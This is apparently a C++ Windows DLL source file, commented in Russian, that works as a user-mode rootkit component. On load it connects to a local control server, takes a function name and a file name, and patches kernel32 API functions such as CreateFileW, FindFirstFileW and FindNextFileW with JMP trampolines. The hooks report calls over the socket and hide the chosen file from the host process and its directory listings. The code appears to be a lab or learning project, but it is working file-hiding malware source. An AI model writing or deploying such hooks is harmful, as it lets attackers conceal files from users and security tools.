// dllmain.cpp : Определяет точку входа для приложения DLL.



#define WIN32_LEAN_AND_MEAN
#include "framework.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <chrono>
#include <ctime>
#include <format>
#include <string>
#include <thread>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#define MAGIC 14
#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

using namespace std;

char func_name[256] = "";
char file_name[256] = "";
SOCKET ConnectSocket = INVALID_SOCKET;

BYTE CreateOrigBytes[MAGIC];
BYTE FirstOrigBytes[MAGIC];
BYTE NextOrigBytes[MAGIC];

BYTE bytesCreate[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};
BYTE bytesFirst[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};
BYTE bytesNext[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};
BYTE bytesSomeFunc[14] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
};


void* pFirstWithTrampoline;
void* pNextWithTrampoline;

wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;
}

int connect_to_server()
{

    FILE* file2;
    fopen_s(&file2, "C:/Users/magar/Desktop/1000101/client_log.txt", "w");

    WSADATA wsaData;
    //SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    const char* sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        fprintf(file2, "WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            fprintf(file2, "socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);
    if (ConnectSocket == INVALID_SOCKET) {
        fprintf(file2, "Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }



    char recv_buff[514] = "";
    iResult = recv(ConnectSocket, recv_buff, _countof(recv_buff), 0);

    int i = 0;
    while (recv_buff[i] != '-') {
        func_name[i] = recv_buff[i];
        i++;
    }
    func_name[i] = 0;
    i++;
    int j = 0;
    while (recv_buff[i + j] != 0) {
        file_name[j] = recv_buff[i + j];
        j++;
    }
    file_name[j] = 0;



    return 0;

}

size_t GetInstructionLength(BYTE* address, size_t minSize) {
    size_t offset = 0;

    while (offset < minSize) {
        BYTE* cur = address + offset;
        size_t instrLen = 0;

        // 1. Пропускаем префиксы (Legacy & REX)
        // 0x66, 0x67 - префиксы размера, 0x40-0x4F - REX префиксы в x64
        size_t prefixCount = 0;
        bool rexW = false;
        while (cur[prefixCount] == 0x66 || cur[prefixCount] == 0x67 ||
            (cur[prefixCount] >= 0x40 && cur[prefixCount] <= 0x4F)) {
            if (cur[prefixCount] == 0x48) rexW = true; // REX.W (64-битный операнд)
            prefixCount++;
        }

        BYTE* opcodePtr = cur + prefixCount;
        BYTE opcode = opcodePtr[0];
        size_t currentLen = prefixCount + 1; // Префиксы + сам опкод

        // 2. Анализ опкодов

        // --- Группа 1: Однобайтовые инструкции (без ModR/M) ---
        if ((opcode >= 0x50 && opcode <= 0x5F) || // push/pop reg
            (opcode >= 0x90 && opcode <= 0x97) || // nop / xchg
            opcode == 0xCC ||                     // int 3
            opcode == 0xC3 ||                     // ret
            opcode == 0x55 ||                     // push rbp
            opcode == 0x5D) {                     // pop rbp
            instrLen = currentLen;
        }

        // --- Группа 2: Инструкции с ModR/M байтом (самая большая группа) ---
        // Сюда входят MOV, ADD, SUB, CMP, INC, DEC, JMP [reg], CALL [reg] и т.д.
        else if (opcode == 0x8B || opcode == 0x89 || // mov
            opcode == 0x83 ||                   // add/sub/cmp reg, imm8
            opcode == 0x81 ||                   // add/sub/cmp reg, imm32
            opcode == 0x33 || opcode == 0x31 || // xor
            opcode == 0x01 || opcode == 0x03 || // add
            opcode == 0xFF ||                   // jmp/call/inc/dec (group 5)
            opcode == 0x8D) {                   // lea

            BYTE modrm = opcodePtr[1];
            currentLen++; // учли ModR/M

            BYTE mod = (modrm >> 6) & 0x03;
            BYTE rm = modrm & 0x07;

            // Обработка SIB байта
            if (mod != 0x03 && rm == 0x04) {
                currentLen++; // SIB байт присутствует
                // Если SIB указывает на 32-битную диспетчеризацию без базы
                if (mod == 0x00 && (opcodePtr[2] & 0x07) == 0x05) currentLen += 4;
            }

            // Обработка Displacement (смещение)
            if (mod == 0x01) currentLen += 1;      // 8-bit displacement
            else if (mod == 0x02) currentLen += 4; // 32-bit displacement
            else if (mod == 0x00 && rm == 0x05) currentLen += 4; // RIP-relative (x64) или 32-bit addr

            // Обработка Immediate (непосредственное значение)
            if (opcode == 0x83) currentLen += 1;      // imm8
            else if (opcode == 0x81) currentLen += 4; // imm32
            else if (opcode == 0xFF && ((modrm >> 3) & 0x07) == 0x00) {} // inc (no imm)

            instrLen = currentLen;
        }

        // --- Группа 3: Прыжки и вызовы (Relative) ---
        else if (opcode == 0xE9 || opcode == 0xE8) { // jmp/call rel32
            instrLen = currentLen + 4;
        }
        else if (opcode == 0xEB || (opcode >= 0x70 && opcode <= 0x7F)) { // short jmp/jcc rel8
            instrLen = currentLen + 1;
        }

        // --- Группа 4: MOV Reg, Imm ---
        else if (opcode >= 0xB8 && opcode <= 0xBF) {
            // В x64 MOV RAX, IMM64 занимает 10 байт (REX.W + Op + 8 bytes imm)
            // Иначе (без REX.W) это MOV EAX, IMM32 (5 байт)
            instrLen = currentLen + (rexW ? 8 : 4);
        }

        // --- Группа 5: Двубайтовые опкоды (0x0F ...) ---
        else if (opcode == 0x0F) {
            BYTE secondOpcode = opcodePtr[1];
            currentLen++;
            // Это очень упрощенно, обычно там идет ModR/M
            if (secondOpcode == 0x1F || secondOpcode == 0x05) instrLen = currentLen + 1; // nop / syscall
            else instrLen = currentLen + 1; // дефолт для 0F
        }

        // --- Fallback (неизвестная инструкция) ---
        else {
            instrLen = 1;
            send(ConnectSocket, "Offset may be incorrect\n", 50, 0);
        }

        if (instrLen == 0) instrLen = 1; // защита от зависания
        offset += instrLen;
    }
    return offset;
}

void* CreateTrampoline(void* targetAddress, int size) {
    // 1. Вычисляем адрес, куда трамплин должен прыгнуть обратно (адрес оригинала + смещение)
    void* returnAddress = (unsigned char*)targetAddress + size;

    // 2. Наш массив-шаблон
    BYTE jumpBack[14] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    // 3. Записываем адрес возврата в массив (с 6-го байта)
    memcpy(&jumpBack[6], &returnAddress, sizeof(void*));

    // 4. Выделяем память под трамплин (разрядность инструкций + наш прыжок)
    void* trampolineStub = VirtualAlloc(nullptr, size + 14, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 5. Копируем "голову" оригинальной функции
    memcpy(trampolineStub, targetAddress, size);

    // 6. Дописываем наш прыжок в конец трамплина
    memcpy((unsigned char*)trampolineStub + size, jumpBack, 14);

    return trampolineStub;
}

typedef HANDLE(WINAPI* CreateFileW_t)(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
    DWORD, DWORD, HANDLE
    );

/*
HANDLE MyCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {

    char notification[] = "Called function: CreateFileW\n";
    send(ConnectSocket, notification, strlen(notification) + 1, 0);
    // 2. СКРЫВАЕМ ФАЙЛ ЕСЛИ НАДО
    LPCWSTR FileToHide = convertCharArrayToLPCWSTR(file_name);
    if (wcsstr(lpFileName, FileToHide)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE; // Процесс думает, что файла нет
    }
    return ((CreateFileW_t)pOriginalWithTrampoline)(lpFileName, dwDesiredAccess, dwShareMode,
        lpSecurityAttributes, dwCreationDisposition,
        dwFlagsAndAttributes, hTemplateFile);
}
*/
HANDLE MyCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {

    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    void* FuncAddr = (void*)GetProcAddress(hKernel32, "CreateFileW");

    *(void**)(&bytesCreate[6]) = (void*)MyCreateFileW;
    // 1. ОТПРАВЛЯЕМ ДАННЫЕ О ТОМ, ЧТО ФУНКЦИЯ ВЫЗВАНА
    char notification[] = "Called function: CreateFileW\n";
    send(ConnectSocket, notification, strlen(notification) + 1, 0);

    // 2. СКРЫВАЕМ ФАЙЛ ЕСЛИ НАДО
    LPCWSTR FileToHide = convertCharArrayToLPCWSTR(file_name);
    if (wcsstr(lpFileName, FileToHide)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE; // Процесс думает, что файла нет
    }
    DWORD oldProtect;
    VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(FuncAddr, CreateOrigBytes, MAGIC);
    HANDLE result = CreateFileW(lpFileName, dwDesiredAccess, dwShareMode,
        lpSecurityAttributes, dwCreationDisposition,
        dwFlagsAndAttributes, hTemplateFile);
    memcpy(FuncAddr, bytesCreate, MAGIC);
    VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);

    return result;
}

typedef HANDLE(WINAPI* FindFirstFileW_t)(LPCWSTR, LPWIN32_FIND_DATAW);
HANDLE MyFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) {

    // 1. ОТПРАВЛЯЕМ ДАННЫЕ О ТОМ, ЧТО ФУНКЦИЯ ВЫЗВАНА
    char notification[] = "Called function: FindFirstFileW\n";
    send(ConnectSocket, notification, strlen(notification) + 1, 0);

    // 2. СКРЫВАЕМ ФАЙЛ ЕСЛИ НАДО
    LPCWSTR FileToHide = convertCharArrayToLPCWSTR(file_name);
    if (wcsstr(lpFileName, FileToHide)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE; // Процесс думает, что файла нет
    }

    return ((FindFirstFileW_t)pFirstWithTrampoline)(lpFileName, lpFindFileData);
}

typedef HANDLE(WINAPI* FindNextFileW_t)(HANDLE, LPWIN32_FIND_DATAW);
BOOL WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {
    // 1. Логируем вызов
    send(ConnectSocket, "Called function: FindNextFileW\n", 31, 0);

    // 2. Вызываем оригинал ЧЕРЕЗ ТРАМПЛИН (хук снимать не нужно!)
    BOOL result = (BOOL)((FindNextFileW_t)pNextWithTrampoline)(hFindFile, lpFindFileData);

    // 3. Проверяем имя файла
    wchar_t* target = convertCharArrayToLPCWSTR(file_name);

    // Используем цикл while вместо if. 
    // Это нужно на случай, если в папке лежат ДВА скрываемых файла подряд.
    while (result && wcsstr(lpFindFileData->cFileName, target)) {
        send(ConnectSocket, "File hidden!\n", 14, 0);

        // Снова вызываем оригинал через трамплин, чтобы получить СЛЕДУЮЩИЙ файл
        result = (BOOL)((FindNextFileW_t)pNextWithTrampoline)(hFindFile, lpFindFileData);
    }

    delete[] target; // Не забываем чистить память за convertCharArrayToLPCWSTR
    return result;
}


// 1 Объявляем внешнюю функцию из .asm
extern "C" void callLogger();

// 2 Объявляем переменные, которые ждет .asm 
extern "C" void* hookPtr = nullptr; // адрес трамплина

// 3 функция-логгер на C++
extern "C" void Logger() {
    send(ConnectSocket, "Target function call detected!\n", 40, 0);
} 

int InstallHook(const char func[256]) {
    HMODULE hKernel32 = GetModuleHandle(L"kernelbase.dll");
    void* FuncAddr = (void*)GetProcAddress(hKernel32, func);

    if (!FuncAddr) return 0;

    DWORD oldProtect;
    if (!strcmp("CreateFileW", func)) {
        hKernel32 = GetModuleHandle(L"kernel32.dll");
        // получаем адрес
        FuncAddr = (void*)GetProcAddress(hKernel32, func);
        // сохраняем старые байты
        memcpy(CreateOrigBytes, FuncAddr, MAGIC);
        // подменяем начало функции
        *(void**)(&bytesCreate[6]) = (void*)MyCreateFileW;
        // разрешаем запись в адресное пространство функции
        VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
        // Перезаписываем начало функции нашим JMP-шаблоном
        memcpy(FuncAddr, bytesCreate, MAGIC);
        // Возвращаем права памяти как было
        VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
    }

    else if (!strcmp("FindFirstFileW", func)) {
        size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
        pFirstWithTrampoline = CreateTrampoline(FuncAddr, (int)actualSize);
        *(void**)(&bytesFirst[6]) = (void*)MyFindFirstFileW;
        VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(FuncAddr, bytesFirst, MAGIC);
        for (size_t i = MAGIC; i < actualSize; i++) {
            ((BYTE*)FuncAddr)[i] = 0x90; // NOP
        }
        VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
    }
    else if (!strcmp("FindNextFileW", func)) {
        size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
        pNextWithTrampoline = CreateTrampoline(FuncAddr, (int)actualSize);
        *(void**)(&bytesNext[6]) = (void*)MyFindNextFileW;
        VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(FuncAddr, bytesNext, MAGIC);
        for (size_t i = MAGIC; i < actualSize; i++) {
            ((BYTE*)FuncAddr)[i] = 0x90; // NOP
        }
        VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
    }

    else {
        // Создаем трамплин
        size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
        hookPtr = CreateTrampoline(FuncAddr, (int)actualSize);
        // Теперь затираем оригинал прыжком на наш ассемблерный callLogger
        *(void**)(&bytesSomeFunc[6]) = (void*)callLogger;
        VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(FuncAddr, bytesSomeFunc, MAGIC);
        for (size_t i = MAGIC; i < actualSize; i++) {
            ((BYTE*)FuncAddr)[i] = 0x90; // NOP
        }
        //send(ConnectSocket, "hook installed\n", 30, 0);
        VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
        
    }
    
    return 1;
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD  reason, LPVOID lpReserved)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH: {
        //52
        Sleep(3000);
        connect_to_server();
        InstallHook(func_name);
             
        //InstallHook("ReadFile");

        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;

}

